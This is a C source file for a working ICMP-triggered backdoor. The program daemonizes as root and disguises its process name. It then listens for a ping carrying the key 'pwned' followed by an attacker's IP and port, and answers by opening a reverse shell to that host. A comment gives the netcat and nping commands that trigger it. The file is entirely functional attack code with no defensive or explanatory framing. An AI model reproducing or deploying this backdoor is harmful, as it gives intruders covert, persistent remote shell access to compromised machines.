#include <stdio.h>
#include <sys/types.h> 
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

#define PACKET_SIZE 	1024
#define KEY         	"pwned"
#define GREETING        "Ready Player One...\n"
#define SHELL       	"/bin/sh"
#define PROCESS_NAME    "reverse_shell"

/*
 * to connect to reverse shell: 
 * on your machine: nc -l [port]
 * sudo nping --icmp -c 1 -dest-ip [destination ip] --data-string '[KEY] [your ip] [port]'
 */

/*
 * Build socket for reverse shell and exec
 */
void reverse_shell(char *attacker_ip, unsigned short int attacker_port){
    	int sockfd;
    	struct sockaddr_in server_addr;
    	struct hostent *server;
    
	//initialize socket and handle failed socket creation
    	sockfd = socket(AF_INET, SOCK_STREAM, 0);
    	if(sockfd < 0)	
		return;

	//query attacker_ip for hostent info, error handling if no host info is found
    	server = gethostbyname(attacker_ip);    	
	if(server == NULL)	
		return;

	//initialize and zero out memory for server_addr, and set protocol to IP 
    	bzero((char *) &server_addr, sizeof(server_addr));
    	server_addr.sin_family = AF_INET;

	//copy host address and set port to attacker port
    	bcopy((char *)server->h_addr, (char *) &server_addr.sin_addr.s_addr, server->h_length);
    	server_addr.sin_port = htons(attacker_port);

	//create socket and error handling failed socket
    	if(connect(sockfd,(struct sockaddr *)&server_addr,sizeof(server_addr)) < 0) 
        	return;
	
	//Print message to socket
    	write(sockfd, GREETING, strlen(GREETING));
	
	//send stdin, stdout, stderr to socket
	int i;
	for (i = 0; i <= 2; i++)
		dup2(sockfd, i);
	
	//exec shell
	execl(SHELL, SHELL, (char *)0);
    	close(sockfd);
}

/*
 * listener for ICMP messages.  The correct message will send a reverse shell to the specified ip address
 */
void icmp_message(void){
	int sockfd;
	int n;	
	int icmp_ksize;
    	char buf[PACKET_SIZE + 1];
   	struct ip *ip;
	struct icmp *icmp;

	icmp_ksize = strlen(KEY);
    	sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP); //create icmp listening socket
    	
	//Listen for icmp packets
	while(1){
        	//get the icmp packet
        	bzero(buf, PACKET_SIZE + 1);        
        	n = recv(sockfd, buf, PACKET_SIZE,0);
		if(n > 0){    
            		ip = (struct ip *)buf;
            		icmp = (struct icmp *)(ip + 1);
            
			// If ICMP_ECHO packet and if KEY matches  */
            		if((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data, KEY, icmp_ksize) == 0)){
		        	char attacker_ip[16];
		        	int attacker_port;
		        
		        	attacker_port = 0;
		        	bzero(attacker_ip, sizeof(attacker_ip));
		        	sscanf((char *)(icmp->icmp_data + icmp_ksize + 1), "%15s %d", attacker_ip, &attacker_port); //parse out attacker_ip and attacker_port
		        
				//error handling for wrong port or wrong ip address
				//printf("%s %d \n", attacker_ip, attacker_port);
		        	if((attacker_port <= 0) || (strlen(attacker_ip) < 7)) 
					continue;
		        	
				//fork off process and start reverse shell
		        	if(fork() == 0){
					reverse_shell(attacker_ip, attacker_port);
				    	exit(EXIT_SUCCESS);
		        	}
            		}//end if
        	}//end if
    	}//end while
}//end ping_listener

int main(int argc, char *argv[]){ 
	//prevent zombies
	signal(SIGCLD, SIG_IGN); 
    	chdir("/");

	//rename the reverse shell process
    	int i;
    	strncpy(argv[0], PROCESS_NAME, strlen(argv[0]));
    	for (i=1; i<argc; i++) 
		memset(argv[i],' ', strlen(argv[i]));
    
	//if successful fork, kill old process
	if (fork() != 0) 
		exit(EXIT_SUCCESS);
    
	//run as root check
    	if (getgid() != 0) {
		fprintf(stdout, "Must be run as root\n");
		exit(EXIT_FAILURE);
    	}    
	
	//start listener
	icmp_message();
    	return EXIT_SUCCESS; //because I'm a good programmer
}
